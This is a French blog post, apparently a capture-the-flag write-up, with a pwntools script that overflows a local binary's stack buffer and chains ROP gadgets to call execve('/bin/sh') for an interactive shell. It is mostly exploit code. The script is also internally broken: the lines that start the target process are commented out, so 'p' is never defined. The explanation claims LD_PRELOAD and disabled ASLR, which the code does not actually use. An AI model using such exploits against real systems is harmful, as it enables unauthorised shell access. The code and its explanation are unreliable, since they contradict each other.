---
title: "WU"
date: 2024-06-01
description: "Notes de cybersécurité"
categories: ["posts"]
tags: []
toc: true
---


### 1. **Création du Payload avec Pwntools**


```python
from pwn import *

# Configuration du binaire et de la session
context.binary = './vuln'  
context.log_level = 'debug'

# Adresses des gadgets ROP et des constantes utiles
POP_RDI = 0x000000000040121c  # Gadget : pop rdi; ret
POP_RSI = 0x0000000000401225  # Gadget : pop rsi; ret
POP_RDX = 0x000000000040122e  # Gadget : pop rdx; ret
SYSCALL = 0x0000000000401237  # Gadget : syscall; ret

BIN_SH = 0x00007fffffffdd38 + 8  # /bin/sh string en mémoire (possible leak)
BASE_ADRESS = 0x00007ffff7db2000  # Adresse de base de libc (à adapter)
POP_RAX = 0x0000000000043067 + BASE_ADRESS  # Gadget : pop rax; ret

# Start du processus vulnérable avec l'injection de libc via LD_PRELOAD pas nécessaire ici
#p = process('./vuln', env={"LD_PRELOAD": "/lib/x86_64-linux-gnu/libc.so.6"})  # Charge libc
# p = remote('adresse_ip', port)  # Pour un challenge distant

# On envoie un choix pour initier la vulnérabilité
p.sendline("1")  # Cela dépend du menu du programme vulnérable

# Construction du payload : overflow + ROP chain
payload = b"A" * 72  # Remplissage jusqu'au retour de l'adresse d'instruction (RIP)

# On construit la ROP chain pour appeler execve("/bin/sh", NULL, NULL)
payload += p64(POP_RDI)   # Gadget : pop rdi; ret
payload += p64(BIN_SH)    # Argument 1 : adresse de "/bin/sh"
payload += p64(POP_RSI)   # Gadget : pop rsi; ret
payload += p64(0)         # Argument 2 : NULL
payload += p64(POP_RDX)   # Gadget : pop rdx; ret
payload += p64(0)         # Argument 3 : NULL
payload += p64(POP_RAX)   # Gadget : pop rax; ret
payload += p64(0x3b)      # Code système pour execve (0x3b = 59)
payload += p64(SYSCALL)   # Gadget : syscall; ret (exécute l'appel système)
payload += b"/bin/sh\x00" # Chaîne "/bin/sh" (terminée par NULL)

# Envoi du payload
p.sendline(payload)

# Passage en mode interactif pour interagir avec le shell
p.interactive()

```

### 2. **Explication du Code**

- **Désactivation de l'ASLR et injection de `libc` via `LD_PRELOAD`** :  
    Le script force l'utilisation de `libc` en la préchargeant via `LD_PRELOAD`, ce qui garantit que les gadgets comme `POP_RDI`, `POP_RSI`, etc., seront disponibles.
    
- **Payload** :  
    Le buffer overflow remplit d'abord la mémoire jusqu'à l'adresse du registre **RIP**. Ensuite, une série de gadgets ROP sont utilisés pour charger les arguments nécessaires pour l'appel système `execve("/bin/sh", NULL, NULL)`, qui ouvre un shell.
    
- **`SYSCALL`** :  
    Une fois les registres configurés, l'instruction **`syscall`** est utilisée pour effectuer l'appel système et exécuter `/bin/sh`.
    
- **Mode interactif** :  
    Après l'exécution du shell, le mode interactif (`p.interactive()`) te permet de prendre le contrôle du shell ouvert.